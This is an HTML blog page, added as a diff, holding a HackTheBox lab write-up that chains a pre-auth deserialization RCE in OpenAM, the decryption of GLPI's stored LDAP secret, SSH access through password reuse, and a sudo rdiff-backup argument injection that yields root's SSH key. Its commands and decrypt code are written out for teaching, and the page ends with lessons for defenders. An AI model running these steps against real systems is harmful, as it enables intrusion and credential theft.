@@ -1,0 +1,630 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta http-equiv="Content-Security-Policy" content="default-src 'self'; base-uri 'self'; form-action 'self'; object-src 'none'; script-src 'self' https://static.cloudflareinsights.com; style-src 'self' 'unsafe-inline' https://fonts.googleapis.com; font-src 'self' https://fonts.gstatic.com; img-src 'self' data:; connect-src 'self' https://cloudflareinsights.com; worker-src 'self' blob:;">
+<meta name="referrer" content="strict-origin-when-cross-origin">
+<style>.writeup-back-link:hover{transform:translateX(-2px);background:rgba(26,26,24,1)!important;}</style>
+<title>HTB: Management — S. Markakis</title>
+<meta name="description" content="OpenAM pre-auth deserialization RCE (CVE-2026-33439) opens a GLPI install, whose encrypted LDAP secret needs GLPI's exact AEAD scheme to crack, then a trailing sudo wildcard on rdiff-backup walks out with root's SSH key.">
+<meta property="og:title" content="HTB: Management — S. Markakis">
+<meta property="og:description" content="OpenAM pre-auth deserialization RCE (CVE-2026-33439) opens a GLPI install, whose encrypted LDAP secret needs GLPI's exact AEAD scheme to crack, then a trailing sudo wildcard on rdiff-backup walks out with root's SSH key.">
+<meta property="og:type" content="article">
+<meta property="og:url" content="https://s-markakis.github.io/writeups/htb-management.html">
+<meta property="og:image" content="https://s-markakis.github.io/writeups/assets/og/htb-management.png">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="https://s-markakis.github.io/writeups/assets/og/htb-management.png">
+<link rel="canonical" href="https://s-markakis.github.io/writeups/htb-management.html">
+
+<link rel="alternate" hreflang="en" href="https://s-markakis.github.io/writeups/htb-management.html">
+<link rel="alternate" hreflang="el" href="https://s-markakis.github.io/writeups/htb-management-el.html">
+<link rel="alternate" hreflang="x-default" href="https://s-markakis.github.io/writeups/htb-management.html">
+
+
+
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link href="https://fonts.googleapis.com/css2?family=Barlow+Condensed:wght@700;800&family=Barlow:wght@400;500;600&family=JetBrains+Mono:wght@400;500&display=swap" rel="stylesheet">
+<link rel="stylesheet" href="../style.css">
+<style>
+  :root {
+    --bg:        #eae8e3;
+    --bg-code:   #dddbd5;
+    --bg-term:   #d4d2cc;
+    --text:      #888880;
+    --text-dark: #1a1a18;
+    --text-mid:  #555550;
+    --border:    #c8c6c0;
+    --tag-bg:    #d8d6d0;
+    --tag-text:  #555550;
+    --accent:    #1a1a18;
+    --t-user:    #4a7c59;
+    --t-host:    #5a6e8a;
+    --t-path:    #7a6040;
+    --t-cmd:     #1a1a18;
+    --t-out:     #666660;
+    --t-yellow:  #8a7030;
+    --t-red:     #8a3030;
+    --t-green:   #3a6a48;
+    --t-comment: #aaa89f;
+    --t-blue:    #3a5a7a;
+  }
+
+  *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
+
+  html { scroll-behavior: smooth; }
+
+  body {
+    background: var(--bg);
+    color: var(--text);
+    font-family: 'Barlow', sans-serif;
+    font-size: 17px;
+    line-height: 1.75;
+    -webkit-font-smoothing: antialiased;
+  }
+
+  .wrapper {
+    position: relative;
+    z-index: 1;
+    width: 100%;
+    max-width: 780px;
+    margin: 0 auto;
+    padding: 4rem 2rem 8rem;
+  }
+
+  .post-header { margin-bottom: 2.5rem; }
+
+  h1 {
+    font-family: 'Barlow Condensed', sans-serif;
+    font-weight: 800;
+    font-size: 3.2rem;
+    line-height: 1.05;
+    color: var(--text-dark);
+    letter-spacing: -.01em;
+    margin-bottom: 1rem;
+  }
+
+  .post-meta {
+    display: flex;
+    align-items: center;
+    gap: 1rem;
+    font-size: 0.85rem;
+    color: var(--text);
+    flex-wrap: wrap;
+  }
+  .post-meta .date { color: var(--text); }
+
+  .tag {
+    background: var(--tag-bg);
+    color: var(--tag-text);
+    font-size: 0.72rem;
+    font-weight: 600;
+    letter-spacing: .08em;
+    text-transform: uppercase;
+    padding: .2rem .6rem;
+    border-radius: 3px;
+  }
+  .tag-htb  { background: #c8d8c0; color: #2a4a28; }
+  .tag-lin  { background: #d8d0c0; color: #4a3a20; }
+  .tag-win  { background: #c0d0e0; color: #1e3a5a; }
+
+  .divider {
+    border: none;
+    border-top: 1px solid var(--border);
+    margin: 2rem 0;
+  }
+
+  .overview {
+    background: var(--bg-code);
+    border-left: 3px solid var(--text-dark);
+    padding: 1.2rem 1.5rem;
+    margin: 2rem 0;
+    font-size: 0.95rem;
+    line-height: 1.7;
+    color: var(--text-mid);
+  }
+
+  .chain {
+    display: flex;
+    flex-wrap: wrap;
+    align-items: center;
+    gap: .4rem;
+    background: var(--bg-code);
+    border: 1px solid var(--border);
+    padding: .9rem 1.2rem;
+    border-radius: 4px;
+    font-family: 'JetBrains Mono', monospace;
+    font-size: 0.74rem;
+    margin: 1.5rem 0 2.5rem;
+    color: var(--text-mid);
+  }
+  .chain-node {
+    background: var(--bg);
+    border: 1px solid var(--border);
+    color: var(--text-dark);
+    padding: .2rem .7rem;
+    border-radius: 3px;
+    font-weight: 500;
+  }
+  .chain-arrow { color: var(--text); }
+
+  h2 {
+    font-family: 'Barlow Condensed', sans-serif;
+    font-weight: 800;
+    font-size: 1.9rem;
+    color: var(--text-dark);
+    margin: 3rem 0 .8rem;
+    letter-spacing: -.01em;
+  }
+
+  h3 {
+    font-family: 'Barlow', sans-serif;
+    font-weight: 600;
+    font-size: 1.1rem;
+    color: var(--text-dark);
+    margin: 2rem 0 .6rem;
+  }
+
+  p { color: var(--text); margin-bottom: 1rem; }
+
+  strong { color: var(--text-dark); font-weight: 600; }
+
+  a { color: var(--text-mid); }
+
+  code {
+    font-family: 'JetBrains Mono', monospace;
+    font-size: 0.82em;
+    background: var(--bg-code);
+    border: 1px solid var(--border);
+    color: var(--text-mid);
+    padding: .1em .4em;
+    border-radius: 3px;
+  }
+
+  .terminal {
+    background: var(--bg-term);
+    border: 1px solid var(--border);
+    border-radius: 6px;
+    margin: 1.4rem 0;
+    overflow: hidden;
+    font-family: 'JetBrains Mono', monospace;
+    font-size: 0.8rem;
+    line-height: 1.65;
+  }
+  .term-bar {
+    background: var(--bg-code);
+    border-bottom: 1px solid var(--border);
+    padding: .45rem 1rem;
+    display: flex;
+    align-items: center;
+    gap: .4rem;
+  }
+  .dot { width: 11px; height: 11px; border-radius: 50%; }
+  .dr { background: #c07070; }
+  .dy { background: #b8a050; }
+  .dg { background: #60a070; }
+  .term-label {
+    margin-left: auto;
+    font-size: 0.7rem;
+    color: var(--text);
+    letter-spacing: .05em;
+  }
+  .term-body {
+    padding: 1rem 1.3rem;
+    overflow-x: auto;
+    white-space: pre;
+  }
+
+  .pu  { color: var(--t-user);    font-weight: 700; }
+  .ph  { color: var(--t-host);    font-weight: 700; }
+  .pp  { color: var(--t-path); }
+  .ps  { color: var(--t-comment); }
+  .pd  { color: var(--text-mid); }
+  .pc  { color: var(--t-cmd);     font-weight: 500; }
+  .po  { color: var(--t-out); }
+  .py  { color: var(--t-yellow); }
+  .pr  { color: var(--t-red); }
+  .pg  { color: var(--t-green); }
+  .pb  { color: var(--t-blue); }
+  .pco { color: var(--t-comment); }
+
+  .alert {
+    padding: .9rem 1.2rem;
+    margin: 1.4rem 0;
+    border-left: 3px solid;
+    font-size: 0.92rem;
+    border-radius: 0 4px 4px 0;
+  }
+  .alert-info    { background: #d8dde8; border-color: var(--t-blue);  color: #2a3a5a; }
+  .alert-warn    { background: #e8e0c8; border-color: var(--t-yellow); color: #5a4010; }
+  .alert-success { background: #d0ddd0; border-color: var(--t-green); color: #1a3a20; }
+
+  table {
+    width: 100%;
+    border-collapse: collapse;
+    margin: 1.4rem 0;
+    font-size: 0.88rem;
+  }
+  th {
+    text-align: left;
+    padding: .55rem 1rem;
+    font-family: 'Barlow Condensed', sans-serif;
+    font-weight: 700;
+    font-size: 0.8rem;
+    letter-spacing: .08em;
+    text-transform: uppercase;
+    color: var(--text-mid);
+    border-bottom: 2px solid var(--border);
+    background: var(--bg-code);
+  }
+  td {
+    padding: .5rem 1rem;
+    border-bottom: 1px solid var(--border);
+    color: var(--text);
+    font-family: 'JetBrains Mono', monospace;
+    font-size: 0.78rem;
+  }
+  tr:hover td { background: var(--bg-code); }
+
+  ul, ol { padding-left: 1.5rem; margin-bottom: 1rem; }
+  li { color: var(--text); margin-bottom: .3rem; }
+
+  .st td:nth-child(1) { color: var(--text-dark); font-weight: 600; }
+  .st td:nth-child(2) { color: var(--text-mid); }
+
+  footer {
+    border-top: 1px solid var(--border);
+    padding: 2rem 3rem;
+    display: flex;
+    justify-content: space-between;
+    align-items: center;
+    font-size: 0.82rem;
+    color: var(--text);
+  }
+  footer a { color: var(--text-mid); text-decoration: none; }
+  footer a:hover { color: var(--text-dark); }
+
+  .back {
+    display: inline-flex;
+    align-items: center;
+    gap: .4rem;
+    font-size: 0.85rem;
+    color: var(--text);
+    text-decoration: none;
+    margin-bottom: 2.5rem;
+    transition: color .15s;
+  }
+  .back:hover { color: var(--text-dark); }
+
+  .screenshot {
+    max-width: 100%;
+    height: auto;
+    border: 1px solid var(--border);
+    border-radius: 6px;
+    margin: 1.6rem auto;
+    display: block;
+  }
+  picture { display: block; }
+
+  @media (max-width: 600px) {
+    nav { padding: 1rem 1.2rem; }
+    .wrapper { padding: 2rem 1.2rem 5rem; }
+    h1 { font-size: 2.4rem; }
+  }
+</style>
+<script src="../js/theme.js"></script>
+<style>
+  body.dark {
+    --bg:#0f0f0f; --bg-code:#161616; --bg-term:#161616; --border:#2a2a2a;
+    --text:#959086; --text-dark:#f4f3ef; --text-mid:#d4d2cc;
+    --tag-bg:#1e1e1e; --tag-text:#999690; --accent:#f4f3ef;
+    --t-user:#6a9c79; --t-host:#7a8eaa; --t-path:#9a8060; --t-cmd:#f4f3ef;
+    --t-out:#a6a69c; --t-yellow:#aa9050; --t-red:#aa5050; --t-green:#5a8a68;
+    --t-comment:#7a7870; --t-blue:#5a7a9a;
+  }
+</style>
+<style>
+  .htb-cta{display:flex;gap:.6rem;flex-wrap:wrap;margin:1.5rem 0}
+  .htb-cta.top{margin-top:.4rem}
+  .htb-cta a{flex:1 1 220px;display:flex;align-items:center;gap:.75rem;padding:.75rem .9rem;background:var(--bg-code);border:1px solid var(--border);border-radius:8px;text-decoration:none;color:var(--text-dark);font-family:'Barlow',sans-serif;transition:transform .15s,border-color .15s,background .15s}
+  .htb-cta a:hover{transform:translateY(-2px);border-color:var(--text-dark);background:var(--bg-term)}
+  .htb-cta svg{width:20px;height:20px;flex:none;stroke:var(--text-dark);fill:none;stroke-width:2;stroke-linecap:round;stroke-linejoin:round}
+  .htb-cta .l-t{display:block;font-family:'Barlow Condensed',sans-serif;font-weight:600;font-size:1.02rem;letter-spacing:.01em;line-height:1.15;color:var(--text-dark)}
+  .htb-cta .l-s{display:block;font-size:.72rem;color:var(--text-mid);line-height:1.25}
+  .htb-cta .l-x{margin-left:auto;color:var(--text-mid);font-size:.95rem}
+</style>
+<script id="sp1r4-jsonld" type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@type": "BlogPosting",
+  "headline": "HTB: Management",
+  "description": "OpenAM pre-auth deserialization RCE (CVE-2026-33439) opens a GLPI install, whose encrypted LDAP secret needs GLPI's exact AEAD scheme to crack, then a trailing sudo wildcard on rdiff-backup walks out with root's SSH key.",
+  "datePublished": "2026-09-26",
+  "dateModified": "2026-09-26",
+  "author": {
+    "@type": "Person",
+    "name": "S. Markakis",
+    "url": "https://s-markakis.github.io/"
+  },
+  "publisher": {
+    "@type": "Person",
+    "name": "S. Markakis",
+    "url": "https://s-markakis.github.io/"
+  },
+  "url": "https://s-markakis.github.io/writeups/htb-management.html",
+  "image": "https://s-markakis.github.io/writeups/assets/og/htb-management.png",
+  "keywords": [
+    "hackthebox",
+    "linux"
+  ],
+  "mainEntityOfPage": {
+    "@type": "WebPage",
+    "@id": "https://s-markakis.github.io/blog.html#htb-management"
+  },
+  "timeRequired": "PT8M"
+}
+</script>
+</head>
+<body class="has-nav">
+<nav id="site-nav"></nav>
+<a href="../blog.html" class="writeup-back-link" style="position:fixed;top:66px;left:18px;z-index:51;display:inline-flex;align-items:center;gap:8px;padding:8px 14px;background:rgba(26,26,24,0.92);color:#eae8e3;font-family:'Barlow',sans-serif;font-size:12px;font-weight:500;letter-spacing:0.04em;text-decoration:none;border-radius:4px;border:0.5px solid rgba(234,232,227,0.15);backdrop-filter:blur(8px);transition:transform 0.18s,background 0.18s;"><svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><line x1="19" y1="12" x2="5" y2="12"/><polyline points="12 19 5 12 12 5"/></svg>Back to blog</a>
+
+<div class="wrapper">
+
+  <a class="back" href="https://s-markakis.github.io/blog.html">← Back to posts</a>
+  <p style="font-size:.8rem;letter-spacing:.04em;color:var(--text-mid);margin-bottom:1.2rem;"><strong style="color:var(--text-dark);">English</strong> &nbsp;·&nbsp; <a href="htb-management-el.html" style="font-weight:600;">Ελληνικά</a></p>
+
+  <div class="post-header">
+    <h1>HTB: Management</h1>
+    <div class="post-meta">
+      <span class="date">September 26, 2026</span>
+      <span class="tag tag-htb">HackTheBox</span>
+      <span class="tag tag-lin">Linux</span>
+      <span class="tag">Pre-auth deserialization</span>
+      <span class="tag">Medium</span>
+      <span>&nbsp;10 min read</span>
+    </div>
+  </div>
+
+  <div class="htb-cta top">
+  <a href="https://app.hackthebox.com/users/332355" target="_blank" rel="noopener">
+    <svg viewBox="0 0 24 24"><polygon points="12 2 22 8.5 22 15.5 12 22 2 15.5 2 8.5"/><line x1="12" y1="22" x2="12" y2="15.5"/><polyline points="22 8.5 12 15.5 2 8.5"/></svg>
+    <span><span class="l-t">HackTheBox</span><span class="l-s">My HTB profile &amp; more boxes</span></span>
+    <span class="l-x">↗</span>
+  </a>
+  <a href="https://github.com/s-markakis" target="_blank" rel="noopener">
+    <svg viewBox="0 0 24 24"><path d="M9 19c-5 1.5-5-2.5-7-3m14 6v-3.87a3.37 3.37 0 0 0-.94-2.61c3.14-.35 6.44-1.54 6.44-7A5.44 5.44 0 0 0 20 4.77 5.07 5.07 0 0 0 19.91 1S18.73.65 16 2.48a13.38 13.38 0 0 0-7 0C6.27.65 5.09 1 5.09 1A5.07 5.07 0 0 0 5 4.77a5.44 5.44 0 0 0-1.5 3.78c0 5.42 3.3 6.61 6.44 7A3.37 3.37 0 0 0 9 18.13V22"/></svg>
+    <span><span class="l-t">GitHub</span><span class="l-s">Open-source security &amp; automation tools</span></span>
+    <span class="l-x">↗</span>
+  </a>
+</div>
+
+  <hr class="divider">
+
+  <div class="overview">
+    Management is a Linux box whose front door is a self-hosted identity provider — an OpenAM fork maintained by the OpenIdentityPlatform project, sitting behind a family of vhosts (<code>sso.</code>, <code>backup.</code>, <code>monitoring.</code>) that all point at one host. The entry is a <strong>pre-authentication Java deserialization RCE</strong> (CVE-2026-33439) in the SSO console itself — no login required. That shell lands in a GLPI asset-management install, whose database hands over an <strong>encrypted</strong> LDAP bind secret rather than a plaintext one. Decrypting it correctly — not just "some AES", but GLPI's exact AEAD construction, including one call-signature detail that isn't obvious from the outside — is the real puzzle of the box. The plaintext turns out to be reused as a real user's SSH password, and from there a single trailing wildcard in a sudo rule for <code>rdiff-backup</code> is all it takes to copy out root's own SSH key.
+  </div>
+
+  <div class="chain">
+    <span class="chain-node">unauthenticated</span>
+    <span class="chain-arrow">→</span>
+    <span class="chain-node">OpenAM pre-auth deser RCE (CVE-2026-33439)</span>
+    <span class="chain-arrow">→</span>
+    <span class="chain-node">GLPI DB creds</span>
+    <span class="chain-arrow">→</span>
+    <span class="chain-node">decrypt stored LDAP secret</span>
+    <span class="chain-arrow">→</span>
+    <span class="chain-node">password reuse → SSH</span>
+    <span class="chain-arrow">→</span>
+    <span class="chain-node">sudo rdiff-backup arg injection</span>
+    <span class="chain-arrow">→</span>
+    <span class="chain-node">root</span>
+  </div>
+
+  <!-- ══ RECON ══ -->
+  <h2>Reconnaissance</h2>
+
+  <p>A standard sweep turns up a single web front door fronting several virtual hosts, all resolved to the same IP:</p>
+
+  <div class="terminal">
+    <div class="term-bar"><span class="dot dr"></span><span class="dot dy"></span><span class="dot dg"></span><span class="term-label">vhosts + the SSO console</span></div>
+    <div class="term-body"><span class="pd">$ </span><span class="pc">echo '&lt;target&gt; management.htb sso.management.htb backup.management.htb monitoring.management.htb' | sudo tee -a /etc/hosts</span>
+<span class="pd">$ </span><span class="pc">curl -skI https://sso.management.htb/openam/</span>
+<span class="po">HTTP/1.1 200 OK</span>
+<span class="pco"># /openam/base/Version and the console copyright string identify it as the</span>
+<span class="pco"># OpenIdentityPlatform / 3A Systems fork of ForgeRock OpenAM, not stock ForgeRock.</span></div>
+  </div>
+
+  <p>That distinction matters: public PoCs written against stock ForgeRock OpenAM don't always apply to this fork, and vice versa. The copyright string in the version panel is the tell.</p>
+
+  <!-- ══ FOOTHOLD ══ -->
+  <h2>Foothold — pre-auth deserialization in the SSO console</h2>
+
+  <p>OpenAM's classic UI is built on the ancient JATO framework, which — like a lot of pre-2015 Java web frameworks — happily deserializes a client-supplied session blob. <strong>CVE-2026-33439</strong> is exactly that: the <code>jato.clientSession</code> parameter on the password-reset validation endpoint accepts an attacker-controlled serialized Java object, and a Click/Xalan <code>TemplatesImpl</code> gadget chain turns that into arbitrary code execution — before any authentication happens.</p>
+
+  <div class="terminal">
+    <div class="term-bar"><span class="dot dr"></span><span class="dot dy"></span><span class="dot dg"></span><span class="term-label">CVE-2026-33439 — pre-auth RCE</span></div>
+    <div class="term-body"><span class="pd">$ </span><span class="pc">python3 exploit.py --url https://sso.management.htb/openam/ui/PWResetUserValidation id</span>
+<span class="pco"># the gadget appends the jato.clientSession param with a packed, integrity-checked</span>
+<span class="pco"># serialized payload; the command to run travels in a 'cmd' request header and its</span>
+<span class="pco"># output comes back in the response body — no listener, no callback, request/response only</span>
+<span class="pg">uid=... gid=... (the OpenAM/tomcat service account)</span></div>
+  </div>
+
+  <p>No inbound shell to babysit — every subsequent command is just another request with a different <code>cmd</code> header. That turns out to matter later, once the interesting part of the box needs several rounds of enumeration.</p>
+
+  <!-- ══ ENUM ══ -->
+  <h2>Pivoting into GLPI</h2>
+
+  <p>The service account's filesystem holds a GLPI (open-source IT asset/helpdesk) install. GLPI's own DB config file is always a first stop — it's plaintext by design, since the app needs it at every request:</p>
+
+  <div class="terminal">
+    <div class="term-bar"><span class="dot dr"></span><span class="dot dy"></span><span class="dot dg"></span><span class="term-label">GLPI's own DB credentials</span></div>
+    <div class="term-body"><span class="pd">$ </span><span class="pc"># via the RCE: cat /opt/glpi/config/config_db.php</span>
+<span class="po">class DB extends DBmysql {
+   public $dbhost = '127.0.0.1';
+   public $dbuser = 'glpi';
+   public $dbpassword = '&lt;redacted&gt;';
+   public $dbdefault = 'glpidb';
+}</span></div>
+  </div>
+
+  <div class="alert alert-warn"><strong>Gotcha:</strong> connecting with <code>-h127.0.0.1</code> gets <code>Access denied</code> even with the right password — MySQL resolves a TCP connection to a different grant than a Unix-socket one, and this account is only granted for <code>glpi@localhost</code>. Drop <code>-h</code> entirely to use the local socket.</div>
+
+  <p>GLPI stores its own LDAP directory configuration — including the bind account's password — encrypted in the database, in <code>glpi_authldaps.rootdn_passwd</code> (not <code>rootdn_password</code>; worth a <code>describe</code> before guessing the schema):</p>
+
+  <div class="terminal">
+    <div class="term-bar"><span class="dot dr"></span><span class="dot dy"></span><span class="dot dg"></span><span class="term-label">the LDAP directory row</span></div>
+    <div class="term-body"><span class="pd">$ </span><span class="pc">mysql -uglpi -p'&lt;pw&gt;' glpidb -e "select name,host,rootdn,rootdn_passwd from glpi_authldaps;"</span>
+<span class="po">name: Management Directory
+host: sso.management.htb
+rootdn: cn=svc-glpi,ou=services,dc=management,dc=htb
+rootdn_passwd: &lt;base64 ciphertext&gt;</span></div>
+  </div>
+
+  <p>That value isn't a hash to crack — it's symmetrically encrypted, and GLPI keeps the key on disk specifically so it <em>can</em> decrypt it again for its own use:</p>
+
+  <div class="terminal">
+    <div class="term-bar"><span class="dot dr"></span><span class="dot dy"></span><span class="dot dg"></span><span class="term-label">the key that makes it reversible</span></div>
+    <div class="term-body"><span class="pd">$ </span><span class="pc"># via the RCE: base64 -w0 /opt/glpi/config/glpicrypt.key</span>
+<span class="po">&lt;32 raw bytes, base64-encoded&gt;</span></div>
+  </div>
+
+  <!-- ══ DECRYPT PUZZLE ══ -->
+  <h2>The actual puzzle: GLPI's AEAD scheme, exactly</h2>
+
+  <p>32-byte key, 24-byte nonce prepended to the ciphertext, then base64 — that shape matches libsodium's <code>crypto_secretbox</code> (XSalsa20-Poly1305) closely enough that it's tempting to just try it. It fails MAC verification every time, silently, with no clue as to why. So does the same shape with an empty additional-authenticated-data field on the AEAD construction that's actually correct. Guessing crypto primitives from ciphertext shape alone is a trap — I went and read GLPI's own source instead of continuing to guess:</p>
+
+  <div class="terminal">
+    <div class="term-bar"><span class="dot dr"></span><span class="dot dy"></span><span class="dot dg"></span><span class="term-label">src/GLPIKey.php — the actual construction</span></div>
+    <div class="term-body"><span class="pco">// encrypt():</span>
+<span class="pc">$nonce = random_bytes(SODIUM_CRYPTO_AEAD_XCHACHA20POLY1305_IETF_NPUBBYTES);
+$encrypted = sodium_crypto_aead_xchacha20poly1305_ietf_encrypt(
+    $string, $nonce, $nonce, $key      </span><span class="pco">// ← AAD == the nonce itself</span><span class="pc">
+);
+return base64_encode($nonce . $encrypted);</span></div>
+  </div>
+
+  <p>The primitive is <strong>XChaCha20-Poly1305</strong>, not secretbox — coincidentally the same 24-byte nonce length, which is exactly why the wrong guess fails in a way that looks almost right. And the actual gotcha: GLPI passes the nonce a second time as the <strong>additional authenticated data</strong> argument, not an empty string. Miss that and every attempt fails MAC verification with an identical, uninformative error, whether the primitive, the key, or the AAD is wrong. Once the call signature matches exactly:</p>
+
+  <div class="terminal">
+    <div class="term-bar"><span class="dot dr"></span><span class="dot dy"></span><span class="dot dg"></span><span class="term-label">decrypt, offline, no further target interaction</span></div>
+    <div class="term-body"><span class="pd">$ </span><span class="pc">python3 -c "
+import base64, nacl.bindings as nb
+key = base64.b64decode(KEY_B64)
+blob = base64.b64decode(DB_VALUE_B64)
+nonce, ct = blob[:24], blob[24:]
+print(nb.crypto_aead_xchacha20poly1305_ietf_decrypt(ct, nonce, nonce, key))
+"</span>
+<span class="pg">b'&lt;redacted — LDAP bind password&gt;'</span></div>
+  </div>
+
+  <p>The whole decrypt runs locally once both pieces are captured — no more requests to the target needed for this step, which also means no more RCE round-trips to keep quiet about.</p>
+
+  <!-- ══ LATERAL ══ -->
+  <h2>Password reuse → a real shell</h2>
+
+  <p>The bind account is a service identity (<code>cn=svc-glpi,...</code>), not a login. But its password isn't unique to LDAP — it's reused directly as a local user's SSH password:</p>
+
+  <div class="terminal">
+    <div class="term-bar"><span class="dot dr"></span><span class="dot dy"></span><span class="dot dg"></span><span class="term-label">user.txt</span></div>
+    <div class="term-body"><span class="pd">$ </span><span class="pc">ssh owen@management.htb</span>
+<span class="pd">owen@management:~$ </span><span class="pc">id; cat user.txt</span>
+<span class="pg">uid=1000(owen) gid=1000(owen) groups=1000(owen)
+[redacted — user flag]</span></div>
+  </div>
+
+  <!-- ══ PRIVESC ══ -->
+  <h2>Root — a wildcard in a sudo rule</h2>
+
+  <p><code>sudo -l</code> shows exactly one rule, and it's built to be "safe":</p>
+
+  <div class="terminal">
+    <div class="term-bar"><span class="dot dr"></span><span class="dot dy"></span><span class="dot dg"></span><span class="term-label">sudo -l</span></div>
+    <div class="term-body"><span class="pd">owen@management:~$ </span><span class="pc">sudo -l</span>
+<span class="po">User owen may run the following commands on management:
+</span><span class="pg">    (root) NOPASSWD: /usr/bin/rdiff-backup --server --restrict-path /opt/backup --restrict-mode read-only *</span></div>
+  </div>
+
+  <p>The intent is clear: let <code>owen</code> drive rdiff-backup's remote-server mode as root, but only against <code>/opt/backup</code>, and only read-only. The trailing <code>*</code> is the mistake — sudoers matches the whole command line as a pattern, so anything appended after <code>read-only</code> is still permitted, and rdiff-backup — like most argument parsers — takes the <em>last</em> value when a flag repeats. Appending a second <code>--restrict-path /</code> after the fixed one silently overrides it.</p>
+
+  <p>rdiff-backup normally reaches a "remote" side over SSH via <code>--remote-schema</code>. Since we're already local as <code>owen</code>, the schema string just needs to <em>be</em> the sudo command — no <code>ssh</code> in it at all, so it runs as a plain local subprocess connected to our client over a pipe:</p>
+
+  <div class="terminal">
+    <div class="term-bar"><span class="dot dr"></span><span class="dot dy"></span><span class="dot dg"></span><span class="term-label">root, via argument injection</span></div>
+    <div class="term-body"><span class="pd">owen@management:~$ </span><span class="pc">rdiff-backup --remote-schema "sudo /usr/bin/rdiff-backup --server \
+     --restrict-path /opt/backup --restrict-mode read-only --restrict-path %s" \
+     backup /::/root /tmp/root_backup</span>
+<span class="pco"># the source location '/::/root' uses rdiff-backup's [host::]path syntax with an</span>
+<span class="pco"># empty/'/' host field — that parsed "host" is exactly what substitutes into %s,</span>
+<span class="pco"># so the injected --restrict-path / is built from the location string, not typed directly</span>
+<span class="pg">NOTE: Starting mirror from source path /root to destination path /tmp/root_backup</span>
+<span class="pd">owen@management:~$ </span><span class="pc">ls /tmp/root_backup</span>
+<span class="po">.ssh  root.txt  ...</span></div>
+  </div>
+
+  <p>The sudo'd "server" side runs fully unrestricted as root, and everything under <code>/root</code> — including the flag and root's own SSH keypair — gets copied out, owned by <code>owen</code>:</p>
+
+  <div class="terminal">
+    <div class="term-bar"><span class="dot dr"></span><span class="dot dy"></span><span class="dot dg"></span><span class="term-label">root.txt + durable access</span></div>
+    <div class="term-body"><span class="pd">owen@management:~$ </span><span class="pc">cat /tmp/root_backup/root.txt</span>
+<span class="pg">[redacted — root flag]</span>
+<span class="pd">$ </span><span class="pc">scp owen@management.htb:/tmp/root_backup/.ssh/id_ed25519 . &amp;&amp; ssh -i id_ed25519 root@management.htb id</span>
+<span class="pg">uid=0(root) gid=0(root) groups=0(root)</span></div>
+  </div>
+
+  <!-- ══ RECAP ══ -->
+  <h2>The whole chain, one screen</h2>
+
+  <div class="terminal">
+    <div class="term-bar"><span class="dot dr"></span><span class="dot dy"></span><span class="dot dg"></span><span class="term-label">recap</span></div>
+    <div class="term-body"><span class="pco"># 1. pre-auth deser RCE in the OpenAM fork (CVE-2026-33439)</span>
+<span class="pc">python3 exploit.py --url https://sso.management.htb/openam/ui/PWResetUserValidation id</span>
+
+<span class="pco"># 2. GLPI's own DB creds, then the encrypted LDAP secret + the key that unlocks it</span>
+<span class="pc">cat config_db.php ; select rootdn_passwd from glpi_authldaps ; cat glpicrypt.key</span>
+
+<span class="pco"># 3. decrypt offline — XChaCha20-Poly1305, nonce reused as AAD (the non-obvious part)</span>
+<span class="pc">sodium_crypto_aead_xchacha20poly1305_ietf_decrypt(ct, nonce, nonce, key)</span>
+
+<span class="pco"># 4. password reuse → real SSH login</span>
+<span class="pc">ssh owen@management.htb</span>
+
+<span class="pco"># 5. sudo wildcard + last-flag-wins → unrestricted rdiff-backup as root</span>
+<span class="pc">rdiff-backup --remote-schema "sudo rdiff-backup --server ... --restrict-path %s" backup /::/root /tmp/x</span></div>
+  </div>
+
+  <!-- ══ LESSONS ══ -->
+  <h2>Lessons</h2>
+
+  <ul>
+    <li><strong>A stored secret is only as strong as the schema you assume for it.</strong> The ciphertext's shape (key length, nonce length) matched more than one plausible construction. Guessing cost more time than reading the eleven lines of source that stated the real one — including the one call-signature detail (AAD = nonce) that no amount of shape-guessing would have found.</li>
+    <li><strong>A sudo rule with a trailing wildcard is not a scoped rule.</strong> Sudoers pattern-matches the full command line as a string; anything the wildcard admits, the invoker can use to shadow an earlier flag if the target program takes last-value-wins on repeats. Scope with fixed arguments only, never a trailing <code>*</code>.</li>
+    <li><strong>Request/response RCE beats a reverse shell for a multi-step chain.</strong> Every enumeration step here was a separate HTTP request with a different <code>cmd</code> header — nothing to keep alive, nothing to lose on a dropped connection, and it scales cleanly to "just one more command" as many times as the chain needs.</li>
+    <li><strong>Password reuse across a service identity and a real login is still the most common lateral-movement primitive</strong> on these boxes, encrypted-at-rest or not — decrypting a secret is rarely the end of the story, it's usually just the start of "where else does this work."</li>
+  </ul>
+
+</div>
+<div class="htb-cta">
+  <a href="https://app.hackthebox.com/users/332355" target="_blank" rel="noopener">
+    <svg viewBox="0 0 24 24"><polygon points="12 2 22 8.5 22 15.5 12 22 2 15.5 2 8.5"/><line x1="12" y1="22" x2="12" y2="15.5"/><polyline points="22 8.5 12 15.5 2 8.5"/></svg>
+    <span><span class="l-t">HackTheBox</span><span class="l-s">My HTB profile &amp; more boxes</span></span>
+    <span class="l-x">↗</span>
+  </a>
+  <a href="https://github.com/s-markakis" target="_blank" rel="noopener">
+    <svg viewBox="0 0 24 24"><path d="M9 19c-5 1.5-5-2.5-7-3m14 6v-3.87a3.37 3.37 0 0 0-.94-2.61c3.14-.35 6.44-1.54 6.44-7A5.44 5.44 0 0 0 20 4.77 5.07 5.07 0 0 0 19.91 1S18.73.65 16 2.48a13.38 13.38 0 0 0-7 0C6.27.65 5.09 1 5.09 1A5.07 5.07 0 0 0 5 4.77a5.44 5.44 0 0 0-1.5 3.78c0 5.42 3.3 6.61 6.44 7A3.37 3.37 0 0 0 9 18.13V22"/></svg>
+    <span><span class="l-t">GitHub</span><span class="l-s">Open-source security &amp; automation tools</span></span>
+    <span class="l-x">↗</span>
+  </a>
+</div>
+<footer>
+  <span>© 2026 <a href="https://s-markakis.github.io/index.html">S. Markakis</a></span>
+  <span><a href="https://s-markakis.github.io/blog.html">← All posts</a></span>
+</footer>
+
+<script src="../js/i18n.js" defer></script>
+<script src="../js/nav.js" defer></script>
